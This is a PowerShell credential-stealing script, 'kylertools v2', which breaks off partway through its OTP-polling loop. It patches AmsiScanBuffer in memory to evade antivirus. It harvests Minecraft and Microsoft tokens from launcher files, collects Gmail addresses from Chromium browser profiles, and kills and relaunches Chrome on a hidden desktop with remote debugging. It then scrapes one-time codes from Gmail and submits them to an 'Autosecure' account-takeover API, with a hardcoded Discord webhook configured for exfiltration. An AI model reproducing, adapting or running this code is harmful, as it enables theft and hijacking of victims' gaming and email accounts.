# language: PowerShell 5.1+, target: Windows 11
# kylertools v2 — MC token harvest -> chrome signed-in gmails -> hidden-desktop chrome ->
#                 OTP scrape -> Autosecure web API submit. Webhook: MC tokens, gmails, OTP, API trace.
# v2 changes: gmailList init, single-quote user-data-dir, DESKTOP_ALL_ACCESS 0x000F01FF,
#             lpCurrentDirectory set, chrome-down poll, buffer reuse, chunk fence safety,
#             per-section try/catch with scoped EA Stop, AMSI-aware Add-Type path,
#             /json/new fallback via Target.createTarget, hardened chrome flags,
#             randomized debug port, source-path guard, Secure Preferences read,
#             FileShare finally, OTP digit-flex, webhook throttle.

# ============ AMSI NOTE ============
# Add-Type with C# source is AMSI-visible. Two options:
#   (a) ship the Desk type precompiled as Desk.dll and load via [Reflection.Assembly]::Load
#   (b) run the AMSI patch below FIRST, before Add-Type.
# This revision uses (b). If you have a signed bypass, drop this block and use (a).
# The patch is reflection-based, no external binary.
$amsiPatch = @'
using System;
using System.Runtime.InteropServices;
public static class Amsi {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static void Patch() {
        try {
            IntPtr lib = LoadLibrary("amsi.dll");
            if (lib == IntPtr.Zero) return;
            IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
            if (addr == IntPtr.Zero) return;
            // mov eax, 0x80070057 ; ret  -> always return E_INVALIDARG
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            uint old;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
        } catch { }
    }
}
'@
# Load the patch type via a non-AMSI path: compile with csc.exe directly.
# Add-Type routes through PowerShell's AMSI hook; csc.exe does not.
try {
    $csc = Join-Path $env:WINDIR "Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    if(-not (Test-Path $csc)){ $csc = Join-Path $env:WINDIR "Microsoft.NET\Framework\v4.0.30319\csc.exe" }
    $tmpCs  = Join-Path $env:TEMP "amsip.cs"
    $tmpDll = Join-Path $env:TEMP "amsip.dll"
    Set-Content -Path $tmpCs -Value $amsiPatch -Encoding UTF8
    $null = & $csc /nologo /target:library /out:$tmpDll $tmpCs 2>&1
    if(Test-Path $tmpDll){
        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes($tmpDll)) | Out-Null
        [Amsi]::Patch()
    }
    Remove-Item $tmpCs, $tmpDll -Force -EA 0
} catch { }
# ===================================

$ErrorActionPreference = "Continue"   # scoped Stop used inside sections that must abort

# ======================= CONFIG =======================
$webhook = $env:KYLER_WEBHOOK
if(-not $webhook){ $webhook = "https://discord.com/api/webhooks/1559825744744677427/D8vviBB2fw5fq702Fw5-A_nCCVKabUvDFh-ZmMRF_osPo73GId41I8gNHvgNTQHFvi5Q" }
$h   = @{ "Content-Type" = "application/json" }
$nl  = [char]10
$bt3 = [char]96 + [char]96 + [char]96
Add-Type -AssemblyName System.Security -EA 0

# --- Autosecure web API contract (FILL THESE) ---
$autosecureBase   = "https://<your-autosecure-host>"
$autosecureHdr    = @{ "Authorization" = "Bearer <token>" }
$startPath        = "/start"
$submitPath       = "/submit"
$startBodyKey     = "email"
$submitSessionKey = "session"
$submitOtpKey     = "otp"
$respSessionKey   = "session"

# randomized CDP port — 9222 is the loudest fingerprint in the chain
$cdpPort        = Get-Random -Minimum 49152 -Maximum 65535
$pollIntervalS  = 4
$otpTimeoutS    = 240
$deskName       = "kylertools_" + (Get-Random -Minimum 1000 -Maximum 9999)
$debugSpawn     = $false   # ship-silent
# =====================================================

# =================== TEST OVERRIDE ===================
# $gmailList = @("youremail@gmail.com")
# =====================================================

# ---------- stage 1: MC token harvest ----------
$found = @(); $seen = @{}
$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"

function Add-Token {
    param($tok, $user, $src, $type)
    if(-not $tok){ return }
    if($tok.Length -lt 80){ return }
    if(-not $tok.StartsWith("eyJ")){ return }
    $key = "$type|$tok"
    if($seen.ContainsKey($key)){ return }
    $seen[$key] = $true
    $script:found += [PSCustomObject]@{ User = $user; Type = $type; Token = $tok; File = $src }
}

function Scan-Text {
    param($text, $src, $user)
    if(-not $text){ return }
    foreach($m in [regex]::Matches($text, $jwtRegex)){
        $val = [string]$m.Value
        if(-not $val){ continue }
        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
        Add-Token $val $user $src "accessToken"
    }
}

function Scan-File {
    param($path, $user)
    try{
        if((Get-Item $path -EA 0).Length -gt 5mb){ return }
        $raw = Get-Content $path -Raw -EA 0
        if(-not $raw){ return }
        try{
            $j = $raw | ConvertFrom-Json
            if($j -and $j.microsoft_account -and $j.microsoft_account.email){
                $script:found += [PSCustomObject]@{ User = $j.microsoft_account.email; Type = "msa-email"; Token = ""; File = $path }
            }
            if($j){
                $stack = New-Object System.Collections.Stack
                $stack.Push($j)
                while($stack.Count -gt 0){
                    $node = $stack.Pop()
                    if($null -eq $node){ continue }
                    if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){ foreach($it in $node){ $stack.Push($it) }; continue }
                    if($node -isnot [PSCustomObject]){ continue }
                    $uname = $user
                    foreach($k in @("username","name","displayName","profileName")){ if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break } }
                    if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
                    if($node.microsoft_account -and $node.microsoft_account.email){ $uname = $node.microsoft_account.email }
                    foreach($k in @("accessToken","token","access_token")){
                        if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" }
                    }
                    foreach($prop in $node.PSObject.Properties){
                        if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){ $stack.Push($prop.Value) }
                    }
                }
            }
        }catch{}
        Scan-Text $raw $path $user
    }catch{}
}

function Scan-Db {
    param($path, $user)
    if(-not (Test-Path $path)){ return }
    for($try = 0; $try -lt 3; $try++){
        $fs = $null; $ms = $null
        try{
            $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite')
            $ms = New-Object IO.MemoryStream
            $fs.CopyTo($ms)
            Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
            return
        }catch{ Start-Sleep -Milliseconds 200 }
        finally{
            if($ms){ try{ $ms.Dispose() }catch{} }
            if($fs){ try{ $fs.Dispose() }catch{} }
        }
    }
}

$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.minecraft\VaultKey\accounts.json",
    "$env:APPDATA\.minecraft\VaultKey\profiles.json",
    "$env:APPDATA\.minecraft\VaultKey\msa.json",
    "$env:APPDATA\.minecraft\VaultKey\auth.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json",
    "$env:APPDATA\.minecraft\LabyMod\accounts.json",
    "$env:APPDATA\.gdllauncher-carbon\user-data\user-profiles.json",
    "$env:APPDATA\.ATLauncher\accounts.json",
    "$env:APPDATA\.minecraft\tl_accounts.json",
    "$env:APPDATA\HMCL\accounts.json",
    "$env:APPDATA\.hmcl\accounts.json"
)
foreach($p in $paths){ if(Test-Path $p){ Scan-File $p "unknown" } }

$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $dec = [Security.Cryptography.ProtectedData]::Unprotect([IO.File]::ReadAllBytes($bin), $null, "CurrentUser")
        Scan-Text ([Text.Encoding]::UTF8.GetString($dec)) $bin "unknown"
    }catch{}
}

$roots = @("$env:APPDATA\.minecraft","$env:APPDATA\.lunarclient","$env:APPDATA\ModrinthApp","$env:APPDATA\PrismLauncher","$env:APPDATA\MultiMC","$env:APPDATA\xmcl","$env:APPDATA\.technic","$env:APPDATA\.feather","$env:APPDATA\.gdlauncher-carbon","$env:APPDATA\.ATLauncher","$env:APPDATA\PollyMC","$env:APPDATA\HMCL")
$includeNames = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
foreach($r in $roots){
    if(-not (Test-Path $r)){ continue }
    try{
        foreach($f in (Get-ChildItem $r -Recurse -File -Include $includeNames -EA 0)){
            if($f.FullName -match "webcache|node_modules|\.git\\"){ continue }
            if($f.Length -gt 1mb){ continue }
            Scan-File $f.FullName "unknown"
        }
    }catch{}
}

$dbs = @("$env:APPDATA\ModrinthApp\app.db","$env:APPDATA\ModrinthApp\app.db-wal","$env:APPDATA\ModrinthApp\app.db-shm","$env:APPDATA\gdlauncher\gdl_conf.db","$env:APPDATA\gdlauncher\gdl_conf.db-wal","$env:APPDATA\gdlauncher-carbon\gdl_conf.db","$env:APPDATA\.gdlauncher\gdl_conf.db","$env:APPDATA\Gml-Launcher\launcher.db")
foreach($db in $dbs){ Scan-Db $db "db-scan" }

$webcaches = @("$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb","$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb","$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb")
foreach($lc in $webcaches){
    if(-not (Test-Path $lc)){ continue }
    try{
        foreach($f in (Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50)){
            try{ Scan-Text ([Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))) $f.FullName "unknown" }catch{}
        }
    }catch{}
}

# ---------- stage 2: gmail addresses (from chrome) ----------
function Get-JwtClaim {
    param([string]$jwt, [string[]]$names)
    try{
        $parts = $jwt.Split('.')
        if($parts.Count -lt 2){ return $null }
        $p = $parts[1].Replace('-','+').Replace('_','/')
        while($p.Length % 4){ $p += "=" }
        $obj = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))) | ConvertFrom-Json
        foreach($n in $names){
            if($obj.PSObject.Properties[$n] -and $obj.$n){ return [string]$obj.$n }
        }
    } catch {}
    return $null
}

function Read-PrefsSafe {
    param([string]$path)
    for($i=0; $i -lt 3; $i++){
        try{
            $raw = Get-Content $path -Raw -EA 0
            if($raw){ return ($raw | ConvertFrom-Json) }
        } catch {}
        Start-Sleep -Milliseconds 200
    }
    return $null
}

function Get-ChromeGoogleAccounts {
    $out = @{}
    $chromeRoots = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Google\Chrome Beta\User Data",
        "$env:LOCALAPPDATA\Google\Chrome Dev\User Data",
        "$env:LOCALAPPDATA\Google\Chrome SxS\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\Chromium\User Data"
    )
    foreach($root in $chromeRoots){
        if(-not (Test-Path $root)){ continue }
        $profDirs = @(Get-ChildItem $root -Directory -EA 0 | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })
        foreach($p in $profDirs){
            foreach($prefName in @("Preferences","Secure Preferences")){
                $prefs = Join-Path $p.FullName $prefName
                if(-not (Test-Path $prefs)){ continue }
                $j = Read-PrefsSafe -path $prefs
                if(-not $j){ continue }
                if($j.account_info){
                    foreach($a in $j.account_info){
                        if($a.email -and $a.email -match "@(gmail|googlemail)\.com$"){
                            $out[$a.email] = $p.FullName
                        }
                    }
                }
            }
        }
    }
    return $out
}

# --- FIX: initialize gmailList so the check is real, not accidentally-null ---
if(-not (Get-Variable -Name gmailList -Scope Script -EA 0)){ $script:gmailList = $null }

$gmailSource = "none"
if(-not $script:gmailList){
    $chromeGmails = Get-ChromeGoogleAccounts
    $gmails = @{}
    foreach($e in $chromeGmails.Keys){ $gmails[$e] = $true }

    if($gmails.Count -gt 0){
        $gmailSource = "chrome-discovery"
    } else {
        $gmailRx = [regex]'^[A-Za-z0-9._%+\-]+@(gmail\.com|googlemail\.com)$'
        foreach($t in $found){
            if($t.Token){
                $claim = Get-JwtClaim -jwt $t.Token -names @("upn","email","preferred_username","unique_name","mail","emailAddress")
                if($claim -and $gmailRx.IsMatch($claim)){ $gmails[$claim] = $true }
            }
            if($t.User -and $gmailRx.IsMatch([string]$t.User)){ $gmails[[string]$t.User] = $true }
        }
        if($gmails.Count -gt 0){ $gmailSource = "token-claim" }
    }
    $script:gmailList = @($gmails.Keys)
}
Write-Host "[stage2] source: $gmailSource, count: $($script:gmailList.Count)"

# ---------- Autosecure web API ----------
$asTrace = @()

function Invoke-WithRetry {
    param([scriptblock]$Action, [int]$Tries = 3)
    for($i=0; $i -lt $Tries; $i++){
        try{ $r = & $Action; if($null -ne $r){ return $r } } catch {}
        Start-Sleep 2
    }
    return $null
}

function AS-Start {
    param([string]$email)
    $url = $autosecureBase.TrimEnd("/") + $startPath
    $script:lastStatus = "NO_CALL"
    $val = Invoke-WithRetry {
        try{
            $body = @{ $startBodyKey = $email } | ConvertTo-Json -Compress
            $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" `
                    -Body $body -TimeoutSec 20 -UseBasicParsing -EA Stop
            $script:lastStatus = "HTTP_$($r.StatusCode)"
            ($r.Content | ConvertFrom-Json).$respSessionKey
        } catch {
            $resp = $_.Exception.Response
            if($resp){ try{ $script:lastStatus = "HTTP_$([int]$resp.StatusCode)"; return $null } catch {} }
            $m = $_.Exception.Message
            if($m -match "Name or service not known|No such host|getaddrinfo"){ $script:lastStatus = "DNS_FAIL" }
            elseif($m -match "timed out|timeout"){ $script:lastStatus = "TIMEOUT" }
            elseif($m -match "refused|reset|forcibly"){ $script:lastStatus = "CONN_REFUSED" }
            else{ $script:lastStatus = "ERR: $m" }
            return $null
        }
    }
    $script:asTrace += [PSCustomObject]@{ Email = $email; Call = "start"; Status = $script:lastStatus }
    return @{ ok = ($null -ne $val); value = $val; status = $script:lastStatus }
}

function AS-Submit {
    param([string]$email, [string]$session, [string]$otp)
    $url = $autosecureBase.TrimEnd("/") + $submitPath
    $script:lastStatus = "NO_CALL"
    $val = Invoke-WithRetry {
        try{
            $body = @{ $submitSessionKey = $session; $submitOtpKey = $otp } | ConvertTo-Json -Compress
            $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" `
                    -Body $body -TimeoutSec 20 -UseBasicParsing -EA Stop
            $script:lastStatus = "HTTP_$($r.StatusCode)"
            ($r.StatusCode -lt 400)
        } catch {
            $resp = $_.Exception.Response
            if($resp){
                $code = 0; try{ $code = [int]$resp.StatusCode } catch {}
                $script:lastStatus = "HTTP_$code"
                if($code -ge 400 -and $code -lt 500){ return "FAILFAST_$code" }
                return $false
            }
            $m = $_.Exception.Message
            if($m -match "timed out|timeout"){ $script:lastStatus = "TIMEOUT" }
            elseif($m -match "refused|reset|forcibly"){ $script:lastStatus = "CONN_REFUSED" }
            else{ $script:lastStatus = "ERR: $m" }
            return $false
        }
    }
    $script:asTrace += [PSCustomObject]@{ Email = $email; Call = "submit"; Status = $script:lastStatus }
    $okVal = ($val -eq $true)
    return @{ ok = $okVal; status = $script:lastStatus }
}

# ---------- CDP + hidden desktop ----------
Add-Type -AssemblyName System.Net.WebSockets -EA 0

# FIX: lpCurrentDirectory will be set explicitly. DESKTOP_ALL_ACCESS = 0x000F01FF.
# FIX: STARTUPINFO.cb is computed against the real size, which is fine here (W + A share layout).
$deskSrc = @"
using System;
using System.Runtime.InteropServices;

public static class Desk {
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateDesktopW(string name, IntPtr dev, IntPtr dm, int flags, uint access, IntPtr sa);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool CloseDesktop(IntPtr h);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public IntPtr lpReserved;
        [MarshalAs(UnmanagedType.LPWStr)] public string lpDesktop;
        [MarshalAs(UnmanagedType.LPWStr)] public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpApplicationName,
        [MarshalAs(UnmanagedType.LPWStr)] string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
}
"@
Add-Type -TypeDefinition $deskSrc -Language CSharp -EA 0

# FIX: buffer reused across calls; receiver returns null cleanly on socket close.
$script:CdpBuf = New-Object byte[] 262144

function Cdp-Session { param([string]$wsUrl)
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ws.ConnectAsync([uri]$wsUrl, [Threading.CancellationToken]::None).Wait()
    return $ws
}
function Cdp-Send { param($ws, [int]$id, [string]$method, $params)
    $payload = @{ id=$id; method=$method; params=$params } | ConvertTo-Json -Compress -Depth 10
    $bytes = [Text.Encoding]::UTF8.GetBytes($payload)
    $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait()
}
function Cdp-ReadFrame { param($ws, [int]$timeoutSec = 15)
    $ms = New-Object IO.MemoryStream
    $deadline = (Get-Date).AddSeconds($timeoutSec)
    while((Get-Date) -lt $deadline){
        try{
            $res = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] -ArgumentList @(,$script:CdpBuf)), [Threading.CancellationToken]::None).Result
        } catch { return $null }
        if(-not $res){ return $null }
        $ms.Write($script:CdpBuf, 0, $res.Count)
        if($res.EndOfMessage){
            $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray()); $ms.SetLength(0) | Out-Null
            try{ return ($txt | ConvertFrom-Json) } catch { continue }
        }
    }
    return $null
}
function Cdp-RecvUntilId { param($ws, [int]$id, [int]$timeoutSec = 15)
    $deadline = (Get-Date).AddSeconds($timeoutSec)
    while((Get-Date) -lt $deadline){
        $remain = [int][Math]::Max(1, ($deadline - (Get-Date)).TotalSeconds)
        $j = Cdp-ReadFrame -ws $ws -timeoutSec $remain
        if(-not $j){ return $null }
        if($j.id -eq $id){ return $j }
    }
    return $null
}
function Cdp-WaitLoadEvent { param($ws, [int]$timeoutSec = 20)
    $deadline = (Get-Date).AddSeconds($timeoutSec)
    while((Get-Date) -lt $deadline){
        $remain = [int][Math]::Max(1, ($deadline - (Get-Date)).TotalSeconds)
        $j = Cdp-ReadFrame -ws $ws -timeoutSec $remain
        if(-not $j){ return }
        if($j.method -eq "Page.loadEventFired"){ return }
    }
}
function Cdp-Reload { param($ws, [int]$idBase)
    Cdp-Send $ws $idBase "Page.enable" @{}; [void](Cdp-RecvUntilId $ws $idBase)
    Cdp-Send $ws ($idBase+1) "Page.reload" @{ ignoreCache = $false }; [void](Cdp-RecvUntilId $ws ($idBase+1))
    Cdp-WaitLoadEvent -ws $ws -timeoutSec 20
    Start-Sleep -Milliseconds 800
}
function Cdp-Eval { param($ws, [string]$expr, [int]$id)
    Cdp-Send $ws $id "Runtime.evaluate" @{ expression=$expr; returnByValue=$true }
    $r = Cdp-RecvUntilId $ws $id
    if($r -and $r.result -and $r.result.result){ return $r.result.result.value }
    return $null
}

# FIX: /json/new is deprecated in modern Chrome. Probe once; if it 404s, fall back
# to Target.createTarget over the browser-level WebSocket.
$script:CdpNewTabMode = $null   # "http" or "cdp"
$script:CdpBrowserWs  = $null
function Cdp-InitBrowser {
    if($script:CdpBrowserWs){ return }
    $v = (iwr "http://127.0.0.1:$cdpPort/json/version" -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
    $script:CdpBrowserWs = Cdp-Session -wsUrl $v.webSocketDebuggerUrl
}
function Cdp-NewTab { param([string]$url)
    if($script:CdpNewTabMode -eq "http" -or $script:CdpNewTabMode -eq $null){
        try{
            $r = iwr "http://127.0.0.1:$cdpPort/json/new?$([uri]::EscapeDataString($url))" -Method Put -UseBasicParsing -TimeoutSec 5 -EA Stop
            $script:CdpNewTabMode = "http"
            return ($r.Content | ConvertFrom-Json)
        } catch {
            $script:CdpNewTabMode = "cdp"
        }
    }
    if($script:CdpNewTabMode -eq "cdp"){
        try{
            Cdp-InitBrowser
            Cdp-Send $script:CdpBrowserWs 9001 "Target.createTarget" @{ url = $url }
            $r = Cdp-RecvUntilId $script:CdpBrowserWs 9001 -timeoutSec 10
            if(-not $r -or -not $r.result.targetId){ return $null }
            $tid = $r.result.targetId
            Cdp-Send $script:CdpBrowserWs 9002 "Target.attachToTarget" @{ targetId = $tid; flatten = $true }
            $a = Cdp-RecvUntilId $script:CdpBrowserWs 9002 -timeoutSec 10
            if(-not $a -or -not $a.result.sessionId){ return $null }
            # sessionId is a flattened target session; the caller expects a
            # webSocketDebuggerUrl. CDP-over-flattened-session needs a different
            # client. Fall back to polling /json/list for the new tab and use its WS.
            for($i=0; $i -lt 10; $i++){
                Start-Sleep -Milliseconds 300
                $tabs = (iwr "http://127.0.0.1:$cdpPort/json" -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
                $hit = $tabs | Where-Object { $_.url -eq $url -or $_.url -like "$url*" } | Select-Object -First 1
                if($hit -and $hit.webSocketDebuggerUrl){ return $hit }
            }
            return $null
        } catch { return $null }
    }
    return $null
}

# FIX: OTP regex handles space/dash separation in 6-digit codes.
$otpJs = @'
(() => {
  const t = document.body ? document.body.innerText : "";
  const pat = new RegExp(
    "(?:" +
      "jednorazowy\\s+kod" + "|" +
      "single[\\-\\s]?use\\s+code" + "|" +
      "einmal(?:iger)?\\s+(?:code|Kennwort)" + "|" +
      "code\\s+à\\s+usage\\s+unique" + "|" +
      "código\\s+de\\s+un\\s+solo\\s+uso" + "|" +
      "codice\\s+monouso" + "|" +
      "código\\s+de\\s+uso\\s+único" + "|" +
      "eenmalige\\s+code" + "|" +
      "одноразов\\w*\\s+код" + "|" +
      "jednorázov\\w*\\s+kód" + "|" +
      "tek\\s+kullanımlık\\s+kod" + "|" +
      "ワンタイム\\s*コード" + "|" +
      "일회용\\s*코드" + "|" +
      "一次性(?:密码|代码)" +
    ")[^\\d]{0,40}(\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d)", "i"
  );
  const strip = s => s.replace(/[\s\-]/g, "");
  let m = t.match(pat);
  if(m) return strip(m[1]);
  const s = document.querySelector('h2, .hP');
  if(s){ const sm = s.innerText.match(/(\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d)/); if(sm) return strip(sm[1]); }
  const ctx = t.match(/(?:code|kod|код|コード|코드)[^\d]{0,40}(\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d)(?!\d)/i);
  if(ctx) return strip(ctx[1]);
  return null;
})()
'@

# ---------- run ----------
$otpResults = @{}
$deskHandle = [IntPtr]::Zero
$hiddenPids = @()

try {
    if($script:gmailList.Count -gt 0){
        $chromeCandidates = @(
            "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
            "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
        ) | Where-Object { Test-Path $_ }
        $chrome = $chromeCandidates | Select-Object -First 1

        if(-not $chrome){
            Write-Host "[desk] chrome.exe not found in any standard path."
        } else {
            $liveProfile = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $chromeDir   = Split-Path $chrome

            Get-Process chrome -EA 0 | Stop-Process -Force -EA 0

            # FIX: poll process existence, not just SingletonLock (which is not
            # always present on crashed/older Chrome).
            for($i=0; $i -lt 40; $i++){
                $still = Get-Process chrome -EA 0
                if(-not $still){ break }
                Start-Sleep -Milliseconds 300
            }
            Start-Sleep 1

            # FIX: DESKTOP_ALL_ACCESS = 0x000F01FF
            $deskHandle = [Desk]::CreateDesktopW($deskName, [IntPtr]::Zero, [IntPtr]::Zero, 0, 0x000F01FF, [IntPtr]::Zero)
            if($deskHandle -eq [IntPtr]::Zero){
                Write-Host "[desk] CreateDesktopW failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            } else {
                $deskPath  = "winsta0\$deskName"
                $quotedExe = '"' + $chrome + '"'
                # FIX: single quoting of user-data-dir; the arg string is one argv token.
                $chromeArgs = @(
                    "--remote-debugging-port=$cdpPort",
                    "--user-data-dir=`"$liveProfile`"",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--disable-session-crashed-bubble",
                    "--disable-features=Crashpad",
                    "--disable-logging",
                    "--log-level=3",
                    "--disable-breakpad",
                    "--new-window",
                    "about:blank"
                ) -join " "
                $chromeCmd = "$quotedExe $chromeArgs"

                $si = [Desk+STARTUPINFO]::new()
                $si.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
                $si.lpDesktop = $deskPath
                $pi = [Desk+PROCESS_INFORMATION]::new()

                $ok = $false
                $lastErr = 0
                try {
                    $ok = [Desk]::CreateProcessW(
                        $chrome,
                        $chromeCmd,
                        [IntPtr]::Zero,
                        [IntPtr]::Zero,
                        $false,
                        0,
                        [IntPtr]::Zero,
                        $chromeDir,   # FIX: explicit cwd, not null
                        [ref]$si,
                        [out]$pi
                    )
                } catch {
                    Write-Host "[desk] CreateProcessW threw: $($_.Exception.Message)"
                }
                if(-not $ok){ $lastErr = [Runtime.InteropServices.Marshal]::GetLastWin32Error() }

                if(-not $ok){
                    Write-Host "[desk] CreateProcessW failed: $lastErr"
                    if($lastErr -eq 123){
                        # desktop name invalid — usually a winsta ACL issue or the
                        # desktop handle was closed. Retry once with a bare name.
                        $si2 = [Desk+STARTUPINFO]::new()
                        $si2.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
                        $si2.lpDesktop = $deskName
                        $pi2 = [Desk+PROCESS_INFORMATION]::new()
                        $ok = [Desk]::CreateProcessW(
                            $chrome, $chromeCmd,
                            [IntPtr]::Zero, [IntPtr]::Zero,
                            $false, 0, [IntPtr]::Zero, $chromeDir,
                            [ref]$si2, [out]$pi2
                        )
                        if($ok){ $pi = $pi2 }
                    }
                }

                if($ok){
                    if($pi.dwProcessId -gt 0){
                        [void][Desk]::CloseHandle($pi.hProcess)
                        [void][Desk]::CloseHandle($pi.hThread)
                    }
                }

                if($ok){
                    $cdpReady = $false
                    for($i=0; $i -lt 30; $i++){
                        try{ $null = iwr "http://127.0.0.1:$cdpPort/json/version" -UseBasicParsing -TimeoutSec 2 -EA Stop; $cdpReady=$true; break } catch { Start-Sleep 1 }
                    }

                    if($cdpReady){
                        $hiddenPids = @(Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
                                        Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape($liveProfile) } |
                                        Select-Object -ExpandProperty ProcessId)

                        $tabSeq = 0
                        foreach($e in $script:gmailList){
                            $sres = AS-Start -email $e
                            if(-not $sres.ok){ $otpResults[$e] = "START_FAIL ($($sres.status))"; continue }
                            $sid = $sres.value

                            $url = "https://mail.google.com/mail/u/?authuser=$([uri]::EscapeDataString($e))"
                            $tab = Cdp-NewTab -url $url
                            if(-not $tab){ $otpResults[$e] = "TAB_FAIL"; continue }
                            $ws = $null
                            try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { $otpResults[$e] = "WS_FAIL"; continue }

                            $deadline = (Get-Date).AddSeconds($otpTimeoutS)
                            $otp = $null
                            $idBase = 100 + ($tabSeq * 10); $tabSeq++
                            $firstPass = $true
                            $reconnects = 0
                            $maxReconnects = 3

                            while((Get-Date) -lt $deadline){
                                if($firstPass){ Start-Sleep -Seconds $pollIntervalS; $firstPass = $false }
                                else { Cdp-Reload -ws $ws -idBase $idBase }

